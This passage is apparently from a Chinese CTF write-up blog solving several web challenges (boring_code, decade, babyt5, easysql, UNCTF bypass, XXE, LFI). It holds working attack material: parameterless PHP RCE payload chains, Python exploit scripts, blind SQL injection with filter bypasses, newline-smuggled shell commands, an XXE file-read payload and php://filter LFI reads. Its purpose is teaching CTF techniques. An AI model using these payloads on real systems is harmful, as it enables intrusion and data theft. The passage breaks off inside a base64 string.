var_dump(filter_var(&quot;compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end (scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;, FILTER_VALIDATE_URL)); string(140) &quot;compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime (time(chdir(next(scandir(pos(localeconv()))))))))))));&quot; parse_url() php &gt; var_dump(parse_url(&quot;compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end (scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;)); array(6) { [&quot;scheme&quot;]=&gt; string(13) &quot;compress.zlib&quot; [&quot;host&quot;]=&gt; string(9) &quot;baidu.com&quot; [&quot;user&quot;]=&gt; string(4) &quot;data&quot; [&quot;pass&quot;]=&gt; string(0) &quot;&quot; [&quot;path&quot;]=&gt; string(10) &quot;/baidu.com&quot; [&quot;query&quot;]=&gt; string(98) &quot;,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot; } file_get_contents() php &gt; echo(file_get_contents(&quot;compress.zlib://data:@baidu.com/baidu.com?, echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;)); echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); 从结果可以看到，该payload：①通过了 filter_var() 的检查；②通过了关于 data:// 的正则匹配；③用过了经过 parse_url() 函数处理后，host 参数匹配 baidu.com 的检查；④在经过 file_get_contents() 函数处理后，为 $code 参数赋值 太强了 Bypass 第二层 第二层关键过滤代码如下： &lt;?php preg_replace(&#39;/[a-z]+\\((?R)?\\)/&#39;, NULL, $code) preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code) ?&gt; 首先解释一下(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数） 只能使用包含a-z字母加括号()的函数（比如 var_dump() 就不能用了），然后必须无参数 无参数的意思是：所使用的的函数不得传入参数，比如： echo(&quot;999&quot;) 其中999就是 echo 函数的参数，而在本题中这样是不行的，但是却可以： echo(time()) 也就是函数中再嵌套一个函数，这样在本题中确实被允许的，所以就利用这一点 [+] 接下来直接看着 payload 来学习，如下： echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); 因为题目中给了如下提示 flag in this file and code in /code 也就是说 flag 在/www/目录下，而我们当前的目录是/www/code，所以要切换到上一级并读取 flag ① localeconv()函数 作用：返回一个包含本地数字及货币格式信息的数组 php &gt; var_dump(localeconv()); array(18) { [&quot;decimal_point&quot;]=&gt; string(1) &quot;.&quot; [&quot;thousands_sep&quot;]=&gt; string(0) &quot;&quot; [&quot;int_curr_symbol&quot;]=&gt; string(0) &quot;&quot; ... 可以看到，该函数返回的是一个数组，并且数组的第一个元素为字符串的点（.） ② pos()函数 作用： 返回数组中的当前元素的值 因为正则条件中有nt，所以current()函数就无法使用，但是它有一个别名，就是pos() php &gt; var_dump(pos(localeconv())); string(1) &quot;.&quot; ③ scandir()函数 作用： 返回指定目录中的文件和目录的数组 前面 pos() 函数输出的值为点（.），所以这里变成scandir(.)，也就是当前目录 php &gt; var_dump(scandir(pos(localeconv()))); array(6) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(8) &quot;code.php&quot; ... } ④ next()函数 作用： 将数组中的内部指针向前移动一位 在刚才 scandir() 函数返回的数组中，第一位是点（.），此时指针默认指向该位（也就是第一位），通过next()函数，将指针移动到下一位，也就是点点（..） php &gt; var_dump(next(scandir(pos(localeconv())))); string(2) &quot;..&quot; ⑤ chdir()函数 作用：改变目录 next() 函数返回点点（..），chdir()函数执行 chdir(..) 也就把目录切换到了上一级 php &gt; var_dump(chdir(next(scandir(pos(localeconv()))))); bool(true) 返回 bool 类型的 true ，说明当前目录切换成功 ⑥ time()函数 作用： 返回自从 Unix 纪元（格林威治时间 1970 年 1 月 1 日 00:00:00）到当前时间的秒数 chdir() 函数返回的是 bool 类型的 true ，所以对不需要传入参数的time()函数来说，本来就没有影响，可以正常执行 php &gt; var_dump(time(chdir(next(scandir(pos(localeconv())))))); int(1572952610) ⑦ localtime()函数 作用： 取得本地时间 localtime()函数可以接受参数，并且第一个参数可以直接接受time()，所以直接利用 localtime ([ int $timestamp = time() [, bool $is_associative = false ]] ) : array php &gt; var_dump(localtime(time(chdir(next(scandir(pos(localeconv()))))))); array(9) { [0]=&gt; int(52) [1]=&gt; int(15) [2]=&gt; ... } 返回的数组中，第一个参数是当前系统的秒数，0 到 59 ⑧ pos()函数 不多说了，获取第一个参数，也就是系统当前的秒数 php &gt; var_dump(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))); int(14) ⑨ chr()函数 作用： 返回相对应于 ascii 所指定的单个字符 chr()函数在这里什么作用呢？因为当秒数为46时，chr(46)=”.”，用来获取点（.）（这里不能再用 localeconv() 函数是因为它不能传入参数） php &gt; var_dump(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))); string(1) &quot;.&quot; ⑩ scandir()函数 继续扫描当前目录（默认目录得上一级，因为我们刚才已经 chdir(“..”) 切换过） php &gt; var_dump(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))); array(6) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; ... [5]=&gt; string(8) &quot;flag.php&quot; } ①① end()函数 作用： 将 array 的内部指针移动到最后一个单元并返回其值 scandir() 返回当前目录的数组，end()函数将指针移动到最后一个（这里就是 flag.php ，因为文件名按字母先后排序，而字母 f 在本题中排最后） php &gt; var_dump(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))); string(8) &quot;flag.php&quot; ①② readfile()函数 作用： 读取文件并写入到输出缓冲 这里将执行readfile(“flag.php”)，将 flag.php 的内容读取出来 php &gt; var_dump(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); flag{Byctf_Borning_Code_Test} int(30) ①③ echo()函数 最后用echo()函数将 flag 输出 测试复现 这里先做一下第二层 Bypass 的复现，代码如下： &lt;?php if (isset($_POST[&#39;code&#39;])){ $code = $_POST[&#39;code&#39;]; if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\\((?R)?\\)/&#39;, NULL, $code)) { if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) { echo &#39;bye~&#39;; }else { eval($code); } } }else{ highlight_file(__FILE__); } ?&gt; EXP import requests url = &quot;http://172.31.19.207/&quot; data = { &quot;code&quot;:&quot;echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot; } while 1: response = requests.post(url,data=data) if &quot;flag&quot; in response.text: print(response.text) break 完整题目的 EXP 如下： import requests url = &quot;http://172.31.19.207/&quot; data = { &quot;url&quot;:&quot;compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot; } while 1: response = requests.post(url,data=data) if &quot;flag&quot; in response.text: print(response.text) break decade本题参考 bytectf boring_code的无参数 RCE 题目进去看到一张图片，右键查看源码看到如下提示 \\&lt;!–src in /code and flag is in this page–> 按照提示，在 URL 后面添加/code得到源码 内容如下 &lt;?php highlight_file(__FILE__); $code = $_GET[&#39;code&#39;]; if (!empty($code)) { if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\\((?R)?\\)/&#39;, NULL, $code)) { if (preg_match(&#39;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) { echo &#39;bye~&#39;; } else { eval($code); } } else { echo &quot;No way!!!&quot;; } } else { echo &quot;No way!!!&quot;; } ?&gt; 回顾一下 boring_code 的 payload： echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); 可以看出来在本题，不能用的函数有： localeconv() time() localtime() readfile() 主要问题有两点：①之前获取点（.）的方法失效了；②readfile() 函数需要用其他代替 然后直接看一下本题的 payload： 第一种 die(next(file(end(scandir(chr(ord(strrev(crypt(serialize(array(chdir(next(scandir(next(scandir(chr(ord(strrev(crypt(serialize(array()))))))))))))))))))))); 第二种 echo(join(file(end(scandir(next(each(scandir(chr(floor(tan(tan(atan(atan(ord(cos(chdir(next(scandir(chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))))))))))))))))))))))); payload 还有很多种，自己去发掘，就不再一个一个分析了，自行分析 babyt5原题 Write Up： https://www.jianshu.com/p/804d95f6d6fb 进入题目后直接拿到源码 &lt;?php highlight_file(__FILE__); $x = $_GET[&#39;x&#39;]; $pos = strpos($x,&quot;php&quot;); if($pos){ exit(&quot;denied&quot;); } $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,&quot;$x&quot;); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $result = curl_exec($ch); echo $result; ?&gt; dirsearch 扫到flag.php 源代码中看到提示 there is no flag /etc/hosts 查看/etc/hosts原代码 发现这个172.18.0.2，用http协议 尝试172.18.0.2，拿到提示 \\&lt;!– include $_GET[a]; –> 存在LFI，并且扫描端口的结果中发现 25 号端口开放 smtp 服务。 于是可以联想到利用gopher协议打 smtp，然后再结合发现的 LFI 漏洞，得出这样的思路 利用gopher打smtp，在日志文件中留下一句话木马，然后用 LFI 包含日志文件获取 webshell 以上思路在本次比赛中没有复现成功，具体思路看原题 Write Up ① 如果成功将一句话写入日志，菜刀连接后拿 flag ② 也可以继续用 LFI 然后伪协议读取 flag easysql点击about发现提交了id参数 添加单引号报错，但是只是提示404 后面的尝试发现了黑名单，先列出来 ?id=-1 or and union select , Bypass ① || 代替 or ② or 被过滤所以 information_schema 不能用，选取另一个系统表 mysql.innodb_table_stats 代替 ③ union/**/select 或者 union%0bselect 代替 union select （中间空格替换掉） ④ join 代替 逗号（,） ⑤ 无列名注入 尝试，发现单引号包裹 ?id=2&#39; || &#39;1 做题前先将几个知识点：① 无列名注入；② join 代替逗号 最后 EXP import requests import string url = &quot;http://47.105.183.208:29898/article.php&quot; all_str = string.printable flag = &#39;&#39; for i in range(1,100): for j in all_str: #id = &quot;0&#39; || ascii(substring((select group_concat(table_name) from mysql.innodb_table_stats) from %d))=%d || &#39;1&#39;=&#39;0&quot;%(i,ord(j)) #id = &quot;0&#39; || ascii(substring((select group_concat(database_name) from mysql.innodb_table_stats) from %d))=%d || &#39;1&#39;=&#39;0&quot;%(i,ord(j)) #id = &quot;0&#39; || ascii(substring((select group_concat(e.3) from (select * from (select 1)a join (select 2)b join (select 3)c union/**/select * from cccttffff.fl111aa44a99g)e) from %d))=%d || &#39;1&#39;=&#39;0&quot;%(i,ord(j)) param = { &#39;id&#39;:id } rep = requests.get(url,params=param) #print(rep.text) #print(param) if &#39;23333333&#39; in rep.text: flag = flag + j print(flag) break 该题表名前要加数据库名，不然注不出来 Reference https://www.cnblogs.com/BOHB-yunying/p/11616311.html https://www.jianshu.com/p/80ce73919edb https://baijiahao.baidu.com/s?id=1644976360202625042&amp;wfr=spider&amp;for=pc https://www.jianshu.com/p/6eba3370cfab Write Up https://mp.weixin.qq.com/s?__biz=MzU3MzczNDg1OQ==&amp;mid=2247484270&amp;idx=1&amp;sn=7958756c27236039713d7b8fd0a1348c&amp;chksm=fd3c69caca4be0dc180ff10d83dae8642f618709f0ebcbb3bf6c33942edeae0c42d6ce85ac48&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1572946533094&amp;sharer_shareid=9acc96b64dfbde0e292e6ebcb72488d2#rd","categories":[],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"https://knlvre.github.io/tags/CTF比赛/"}],"author":"Knlvre"},{"title":"UNCTF Write Up","slug":"UNCTF Write Up","date":"2019-10-31T16:00:00.000Z","updated":"2019-11-27T12:17:54.564Z","comments":true,"path":"2019/11/01/UNCTF Write Up/","link":"","permalink":"https://knlvre.github.io/2019/11/01/UNCTF Write Up/","excerpt":"","text":"UNCTF时间：2019年10月22日 — 2019年10月27日 因为 Write Up 和 复现环境出现得比较晚，所以放到 11 月写 bypass 考点：RCE（命令执行），PHP正则匹配反斜杠的特点，文件通配符，Linux 命令换行，Linux 命令终止符 开始做题前先清楚几个知识点： ① PHP正则匹配反斜杠的特点 在本题的preg_match()函数中，我们可以发现对反斜杠（\\）的过滤使用的是\\，但是这样写是不对的，正确写法是三个反斜杠（\\\\）。在 PHP 正则中，三个反斜杠才能匹配到真正意义上的一个字符反斜杠 因为在 PHP 代码中，PHP解释器本身会对反斜杠进行一次解释，而 正则函数 本身也会对反斜杠进行解释。并且，如果反斜杠后面的字符不需要转义，即反斜杠没有起转义作用时，它就会被当成普通字符串保留下来 两个反斜杠 root@Knlvre:/var/www/html# cat index.php &lt;?php $a = $_GET[a]; if(preg_match(&quot;/\\\\/&quot;,$a)){ echo &quot;NO&quot;; }else{ echo &quot;Yes&quot;; } ?&gt; root@Knlvre:/var/www/html# curl &#39;http://127.0.0.1?a=\\&#39;; Yes PHP解释器完成第一次反斜杠解释，变为：preg_match(“/\\/“,$a)，正则完成第二次反斜杠解释，变为：preg_match(“//“,$a) Ps：等于说第二次解释反斜杠（正则完成的）的时候，反斜杠作用的目标是斜杠（/），但是这没有意义，因为“/”本身就是没有其他作用的字符。preg_match中的第一个参数需要有一对任何非字母、数字、“\\”或空格的字符作为分隔符，也就是我们最常用的“/” 三个反斜杠 root@Knlvre:/var/www/html# cat index.php &lt;?php $a = $_GET[a]; if(preg_match(&quot;/\\\\\\/&quot;,$a)){ echo &quot;NO&quot;; }else{ echo &quot;Yes&quot;; } ?&gt; root@Knlvre:/var/www/html# curl &#39;http://127.0.0.1?a=\\&#39;; NO PHP解释器完成第一次反斜杠解释，三个反斜杠中，第一个反斜杠解释第二个反斜杠，第三个反斜杠解释结尾的“/”，但是因为没有实际作用，所以它被保留下来，变为：preg_match(“/\\/“,$a)，即原本第二个和第三个反斜杠被保留了 正则完成第二次反斜杠解释，变为：preg_match(“/\\/“,$a)，就刚好匹配反斜杠字符 ② 文件通配符 Linux 的命令行中，是允许使用通配符的（?和*） 生成 3 个测试文件 root@Knlvre:/var/www/html# ls abc.txt ab.txt a.txt root@Knlvre:/var/www/html# cat a.txt a root@Knlvre:/var/www/html# cat ab.txt ab root@Knlvre:/var/www/html# cat abc.txt abc “*”的使用 root@Knlvre:/var/www/html# cat a*.txt abc ab a “?”的使用 root@Knlvre:/var/www/html# cat ?.txt a root@Knlvre:/var/www/html# cat a?.txt ab root@Knlvre:/var/www/html# cat ??.txt ab root@Knlvre:/var/www/html# cat a??.txt abc root@Knlvre:/var/www/html# cat ???.txt abc 以上是对文件的匹配，但是当想要匹配的是命令时，则需要加上命令的二进制文件的位置，不然只会提示command not found root@Knlvre:/var/www/html# ca? a.txt bash: ca?: command not found root@Knlvre:/var/www/html# /bin/ca? abc.txt abc 还有一个骚操作可以代替通配符，就是中括号 root@Knlvre:/var/www/html# /bin/[b-d]at abc.txt abc root@Knlvre:/var/www/html# /bin/[a-z]at abc.txt abc ③ Linux 命令换行 在命令执行的过程中，在URL编码中%0a解释为换行符，而我们可以利用它们来执行多条命令（类似 &amp; 的作用） root@Knlvre:/var/www/html# cat index.php &lt;?php echo system($_GET[a]); ?&gt; 可以看到分别执行了我们给的2个命令，并且都返回了 ④ Linux 命令终止符 空格+#（URL编码为%20%23）在 Linux 命令行中为命令的终止符，类似注释符，我们可以利用这个闭合掉源码中的其他东西 OK 出题者对本题做过一次修改：未修改前的非预期解 以及 修改后的预期解，我们这里都看一下： ① 未修改前 题目源码 &lt;?php highlight_file(__FILE__); $a = $_GET[&#39;a&#39;]; $b = $_GET[&#39;b&#39;]; // try bypass it if (preg_match(&quot;/\\&#39;|\\&quot;|,|;|\\\\|\\**|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a)) $a = &quot;&quot;; $a =&#39;&quot;&#39; . $a . &#39;&quot;&#39;; if (preg_match(&quot;/\\&#39;|\\&quot;|;|,|\\**|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b)) $b = &quot;&quot;; $b = &#39;&quot;&#39; . $b . &#39;&quot;&#39;; $cmd = &quot;file $a $b&quot;; str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); system($cmd); ?&gt; 对$a的$b的正则中，反斜杠的匹配都出了问题。而对 $a 的正则中： \\\\|\\** PHP解释器先进行一次解释，变为 \\|** 然后正则再解释一次，变为 |** 所以会导致实际匹配到的字符串为 “|”**。这时候反引号就逃逸出来了，可以直接强制地命令执行（尽管还有拼接到 file 命令后面） ?a=**uname** 发现可以命令执行后，查看当前目录（因为ls命令被禁用，这里用dir） ?a=**dir .** ?a=**dir ../../../** 但是都没有，所以直接用 find 命令找，但是也没有结果 这题正确姿势是用grep -R来找，通过文件内容找 flag grep -R 参数可以从某个目录开始，递归地查找文件内容 http://183.129.189.60:10026/?a=**/bi?/gre? -R ctf** ② 修改后 出题人将\\换到了*前面，其他没变 if (preg_match(&quot;/\\&#39;|\\&quot;|,|;|\\**|\\\\|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a)) if (preg_match(&quot;/\\&#39;|\\&quot;|;|,|\\**|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b)) 这个时候反引号就无法利用了。因为这里导致\\n（换行符）逃逸，所以这里利用它，看着 payload 学习： ?a=\\&amp;b=%0a/bi?/gre? -R ctf # 实际执行的语句就是 file &quot;\\&quot; &quot; /bi?/gre? -R ctf #&quot; a=\\是因为这个传入的反斜杠转义掉第二个双引号，才能是下面的 grep 命令正常执行 root@Knlvre:/var/www/html# file &quot;&quot;&quot; &gt; ^C root@Knlvre:/var/www/html# file &quot;\\&quot;&quot; &quot;: cannot open **&quot;&#39; (No such file or directory) 而b的 空格+# 是为了注释掉最后面的双引号 Do you like xml? 考点：XXE 看到flag in this pic，下载图片，winhex打开在中间发现flag in flag.php的字样 抓包提交用户名和密码，发现可能有XXE 测试 payload &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE whatever[ &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot; ]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt; 解码就是 flag K&amp;K战队的老家 考点：LFI、万能密码 密码爆破无结果，万能密码登陆成功（用浏览器输入会出错，burpsuit输入就可以） 1&#39; || &#39;1 点击 俱乐部运维手册 会提示Identity problems, please relogin 添加x-forwarded-for:127.0.0.1没用，应该要 cookie 了。尝试 URL 中的参数m，LFI payload ?m=php://filter/read=convert.base64-encode/resource=home.php 但是这里提示Illegal 这说明这里还是有做过滤的，应该是有利用价值。过滤了php、base64，用大小写成功绕过 这里直接写home而不是home.php是因为之前的?m=index和?m=debug也都没有加后缀，猜测可能后台会加上去 ?m=php://filter/read=convert.base64-encode/resource=home 解码之后拿到home.php的源码 &lt;?php error_reporting(0); include &quot;./inc/config.php&quot;; $mothed = $_GET[&quot;m&quot;] ? $_GET[&quot;m&quot;] : &quot;index&quot;; $cookie = $_COOKIE[&quot;identy&quot;]; if($mothed == &quot;login&quot;) { $username = $_POST[&quot;user&quot;]; $userpass = $_POST[&quot;pw&quot;]; if($username == &quot;&quot; || $userpass == &quot;&quot;) { die(&#39;&lt;script&gt;alert(&quot;Account or password cannot be empty&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;); } waf($username); waf($userpass); $db-&gt;user_check($username, $userpass, $session); } elseif($mothed == &quot;index&quot;) { check($cookie, $db, $session); echo_index(); } elseif($mothed == &quot;logout&quot;) { check($cookie, $db, $session); setcookie(&quot;identy&quot;,&quot;&quot;); die(&#39;&lt;script&gt;alert(&quot;Goodbye&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;); } else { mothed_waf($mothed); $page = $mothed . &quot;.php&quot;; include($page); check($cookie, $db, $session); $d = new debug($session, $d); $d-&gt;vt($session, $d); $d-&gt;debug($session); } ?&gt; 前面 include 了 ./inc/config.php，修改 payload 拿源码 ?m=Php://filter/convert.Base64-encode/resource=./inc/config.php &lt;?php error_reporting(0); include &quot;session.php&quot;; //include &quot;access.php&quot;; include &quot;func.php&quot;; include &quot;db.php&quot;; $db = new db(); $session = new session(); ?&gt; 同样方法拿session.php &lt;?php error_reporting(0); class session{ public $choose = 1; public $id = 0; public $username = &quot;&quot;; } ?&gt; func.php &lt;?php error_reporting(0); function waf($str) { if(preg_match(&#39;/(and|or|if|select|union|sleep|order|group|by|exp|user|from|where|tables|substr|database|join|greatest|like|not|hex|bin|ascii|md5|benchmark|concat|mid|strcmp|left|right|replace|when|\\/|=|&gt;|&lt;|\\*|\\(|\\)|~|%|!|&amp;&amp;|,|&quot;|;|#|\\^|-)/i&#39;, $str) == 1) { die(&#39;&lt;script&gt;alert(&quot;Illegal&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;); } } function mothed_waf($str) { if(preg_match(&#39;/(base64|php|write)/&#39;, $str) == 1) { die(&#39;&lt;script&gt;alert(&quot;Illegal&quot;);window.location.href=&quot;./home.php?m=index&quot;;&lt;/script&gt;&#39;); } if(preg_match(&#39;/(flag|access)/i&#39;, $str) == 1) { die(&#39;&lt;script&gt;alert(&quot;Illegal&quot;);window.location.href=&quot;./home.php?m=index&quot;;&lt;/script&gt;&#39;); } } function cookie_decode($str) { $data = urldecode($str); $data = substr($data, 1); $arr = explode(&#39;&amp;&#39;, $data); $cipher = &#39;&#39;; foreach($arr as $value) { $num = hexdec($value); $num = $num - 240; $cipher = $cipher.&#39;%&#39;.dechex($num); } $key = urldecode($cipher); $key = base64_decode($key); return $key; } function cookie_encode($str) { $key = base64_encode($str); $key = bin2hex($key); $arr = str_split($key, 2); $cipher = &#39;&#39;; foreach($arr as $value) { $num = hexdec($value); $num = $num + 240; $cipher = $cipher.&#39;&amp;&#39;.dechex($num); } return $cipher; } function check($str, $db, &amp;$session) { if($str == &quot;&quot;) { die(&#39;&lt;script&gt;alert(&quot;Please login again&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;); } $objstr = cookie_decode($str); try { $session = unserialize($objstr); $session-&gt;id = intval($session-&gt;id); waf($session-&gt;username); } catch(Exception $e) { die(&#39;&lt;script&gt;alert(&quot;Identity problems, please relogin&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;); } $db-&gt;index_check($session-&gt;id, $session-&gt;username); } function check1($obj) { if($obj-&gt;username !== &quot;debuger&quot;) { setcookie(&quot;identy&quot;, &quot;&quot;); die(&#39;&lt;script&gt;alert(&quot;Identity problems, please relogin&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;); } } function echo_index() { echo base64_decode(&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPjxoZWFkPjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4KICAgIAogICAgPHRpdGxlPmhvbWU8L3RpdGxlPgogICAgPG1ldGEgbmFtZT0icmVuZGVyZXIiIGNvbnRlbnQ9IndlYmtpdCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UsY2hyb21lPTEiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLCBtYXhpbXVtLXNjYWxlPTEiPgogICAgPG1ldGEgbmFtZT0iYXBwbGUtbW9iaWxlLXdlYi1hcHAtc3RhdHVzLWJhci1zdHlsZSIgY29udGVudD0iYmxhY2siPgogICAgPG1ldGEgbmFtZT0iYXBwbGUtbW9iaWxlLXdlYi1hcHAtY2FwYWJsZSIgY29udGVudD0ieWVzIj4KICAgIDxtZXRhIG5hbWU9ImZvcm1hdC1kZXRlY3Rpb24iIGNvbnRlbnQ9InRlbGVwaG9uZT1ubyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii4vaG9tZV9maWxlcy9sYXl1aS5jc3MiIG1lZGlhPSJhbGwiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL2hvbWVfZmlsZXMvZ2xvYmFsLmNzcyIgbWVkaWE9ImFsbCI+CjxsaW5rIHJlbD0icHJlbG9hZCIgaHJlZj0iLi9ob21lX2ZpbGVzL2YoMSkudHh0IiBhcz0ic2NyaXB0Ij48bGluayByZWw9InByZWxvYWQiIGhyZWY9Ii4vaG9tZV9maWxlcy9mLnR4dCIgYXM9InNjcmlwdCI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iLi9ob21lX2ZpbGVzL2YudHh0Ij48L3NjcmlwdD48L2hlYWQ+Cgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImxheXVpLWxheW91dCBsYXl1aS1sYXlvdXQtYWRtaW4iPgogICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLWhlYWRlciBoZWFkZXIgaGVhZGVyLWRlbW8iPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJsYXl1aS1tYWluIj4KICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJsb2dvIiBocmVmPSIuL2hvbWUucGhwP209aW5kZXgiPgogICAgICA8aW1nIHNyYz0iLi9ob21lX2ZpbGVzL2xvZ28ucG5nIj4KICAgIDwvYT4KICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibGF5dWktbmF2Ij4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImxheXVpLW5hdi1pdGVtIGxheXVpLWhpZGUteHMiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSIuL2hvbWUucGhwP209bG9nb3V0Ij7pgIDlh7rnmbvlvZU8L2E+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJsYXl1aS1uYXYtYmFyIiBzdHlsZT0ibGVmdDogNThweDsgdG9wOiA1NXB4OyB3aWR0aDogMHB4OyBvcGFjaXR5OiAwOyI+PC9zcGFuPjwvdWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLXNpZGUgbGF5dWktYmctYmxhY2siPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJsYXl1aS1zaWRlLXNjcm9sbCI+CiAgICAgICAgICAgICAgICA8dWwgY2xhc3M9ImxheXVpLW5hdiBsYXl1aS1uYXYtdHJlZSBzaXRlLWRlbW8tbmF2IiBsYXktZmlsdGVyPSJkZW1vIj4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImxheXVpLW5hdi1pdGVtIGxheXVpLW5hdi1pdGVtZWQiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iamF2YXNjcmlwdDo7IiBocmVmPSJqYXZhc2NyaXB0OjsiPui1m+ajjeenmOexjTxzcGFuIGNsYXNzPSJsYXl1aS1uYXYtbW9yZSI+PC9zcGFuPjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGRsIGNsYXNzPSJsYXl1aS1uYXYtY2hpbGQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ii4vaG9tZS5waHA/bT1pbmRleCI+5biI5YKF5Lus55qE5paH56ugPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSIuL2hvbWUucGhwP209aW5kZXgiPkNURueahOiHquaIkeS/ruWFuzwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iLi9ob21lLnBocD9tPWRlYnVnIj7kv7HkuZDpg6jov5Dnu7TmiYvlhow8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2RkPgogICAgICAgICAgICAgICAgICAgICAgICA8L2RsPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImxheXVpLW5hdi1iYXIiIHN0eWxlPSJ0b3A6IDUxNy41cHg7IGhlaWdo